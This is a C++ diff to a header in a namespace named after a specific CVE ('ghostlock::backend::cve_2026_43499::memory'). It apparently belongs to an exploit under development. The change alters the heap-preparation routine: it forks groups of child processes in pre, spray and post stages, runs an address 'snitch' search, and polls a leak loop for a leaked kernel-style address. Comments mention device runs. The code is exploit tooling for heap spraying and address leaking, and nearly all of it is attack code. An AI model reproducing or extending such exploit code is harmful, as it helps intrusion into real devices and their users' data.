@@ -36,13 +36,18 @@ namespace ghostlock::backend::cve_2026_43499::memory {
     /** The most children one preparation holds, so its state can live on a stack. */
     inline constexpr std::size_t kMaxPrepareChildren = 32U;
 
-    /** The address search, as the preparation needs it: start it, ask it, reset it. */
+    /** The address search, as the preparation needs it: start it, ask it, reset it.
+     *
+     *  An instance rather than a type: a search holds the answer it found, and a caller that
+     *  handed over a type would be saying the search has no state, which is false for every real
+     *  one. The policy the device uses runs the whole search on start and answers from what came
+     *  back. */
     template <class Snitch>
-    concept AddressSnitch = requires(std::size_t collisions) {
-        { Snitch::start(collisions) } -> std::same_as<bool>;
-        { Snitch::has_collision() } -> std::same_as<bool>;
-        { Snitch::address() } -> std::same_as<std::uint64_t>;
-        { Snitch::reset() } -> std::same_as<void>;
+    concept AddressSnitch = requires(Snitch &snitch, std::size_t collisions) {
+        { snitch.start(collisions) } -> std::same_as<bool>;
+        { snitch.has_collision() } -> std::same_as<bool>;
+        { snitch.address() } -> std::same_as<std::uint64_t>;
+        { snitch.reset() } -> std::same_as<void>;
     };
 
     /** Where a preparation stopped, and why. */
@@ -89,9 +94,8 @@ namespace ghostlock::backend::cve_2026_43499::memory {
     /** Run one preparation. See the file note for what is deliberately not in the
      *  sequence yet. */
     template <HeapSeam Seam, AddressSnitch Snitch>
-    [[nodiscard]] PrepareOutcome prepare_page(const PrepareInputs &inputs,
-                                              const PageGeometry &geometry,
-                                              const PreparePatience &patience) noexcept;
+    [[nodiscard]] PrepareOutcome prepare_page(const PrepareInputs &inputs, const PageGeometry &geometry,
+                                              const PreparePatience &patience, Snitch &snitch) noexcept;
 
     namespace detail {
         /** The children and descriptors one preparation holds. On the caller's stack. */
@@ -169,7 +173,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
 
     template <HeapSeam Seam, AddressSnitch Snitch>
     PrepareOutcome prepare_page(const PrepareInputs &inputs, const PageGeometry &geometry,
-                                const PreparePatience &patience) noexcept {
+                                const PreparePatience &patience, Snitch &snitch) noexcept {
         PrepareOutcome outcome{};
         detail::PrepareState state{};
 
@@ -203,6 +207,15 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         outcome.at_step = PrepareStep::PreChildren;
         for (std::size_t i = 0U; i < plan.pre_groups; ++i) {
             const SeamResult child = Seam::fork_child();
+            if (child.value == 0) {
+                /* In the child. Its work is not ported yet, and what it must not do is return
+                 *  into the caller: a device run showed what that looks like -- the children ran
+                 *  the rest of the probe, one report each, which is the trap this branch exists
+                 *  to close. A child with nothing to do leaves at once. The memory such a child
+                 *  is meant to hold is a later piece, and it cannot be held by a process that
+                 *  exits, which is exactly why this is written down rather than left implicit. */
+                Seam::exit_child();
+            }
             if (child.value <= 0) {
                 outcome.status = PrepareStatus::CallFailed;
                 outcome.error = child.error;
@@ -217,6 +230,15 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         outcome.at_step = PrepareStep::SprayChildren;
         for (std::size_t i = 0U; i < plan.spray_groups; ++i) {
             const SeamResult child = Seam::fork_child();
+            if (child.value == 0) {
+                /* In the child. Its work is not ported yet, and what it must not do is return
+                 *  into the caller: a device run showed what that looks like -- the children ran
+                 *  the rest of the probe, one report each, which is the trap this branch exists
+                 *  to close. A child with nothing to do leaves at once. The memory such a child
+                 *  is meant to hold is a later piece, and it cannot be held by a process that
+                 *  exits, which is exactly why this is written down rather than left implicit. */
+                Seam::exit_child();
+            }
             if (child.value <= 0) {
                 outcome.status = PrepareStatus::CallFailed;
                 outcome.error = child.error;
@@ -232,7 +254,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
 
         /* The search, then the children that wait for it. */
         outcome.at_step = PrepareStep::Snitch;
-        if (!Snitch::start(plan.snitch_collisions)) {
+        if (!snitch.start(plan.snitch_collisions)) {
             outcome.status = PrepareStatus::CallFailed;
             detail::kill_children<Seam>(state);
             return outcome;
@@ -240,10 +262,19 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         outcome.at_step = PrepareStep::PostChildren;
         for (std::size_t i = 0U; i < plan.post_groups; ++i) {
             const SeamResult child = Seam::fork_child();
+            if (child.value == 0) {
+                /* In the child. Its work is not ported yet, and what it must not do is return
+                 *  into the caller: a device run showed what that looks like -- the children ran
+                 *  the rest of the probe, one report each, which is the trap this branch exists
+                 *  to close. A child with nothing to do leaves at once. The memory such a child
+                 *  is meant to hold is a later piece, and it cannot be held by a process that
+                 *  exits, which is exactly why this is written down rather than left implicit. */
+                Seam::exit_child();
+            }
             if (child.value <= 0) {
                 outcome.status = PrepareStatus::CallFailed;
                 outcome.error = child.error;
-                Snitch::reset();
+                snitch.reset();
                 detail::kill_children<Seam>(state);
                 return outcome;
             }
@@ -268,11 +299,11 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         outcome.at_step = PrepareStep::LeakLoop;
         bool found = false;
         for (std::size_t round = 0U; round < patience.poll_rounds && !found; ++round) {
-            found = Snitch::has_collision();
+            found = snitch.has_collision();
         }
-        const std::uint64_t leaked = Snitch::address();
+        const std::uint64_t leaked = snitch.address();
         if (!found || leaked == 0U) {
-            Snitch::reset();
+            snitch.reset();
             ReclaimCounts counts{};
             counts.pre = state.pre;
             counts.post = state.post;
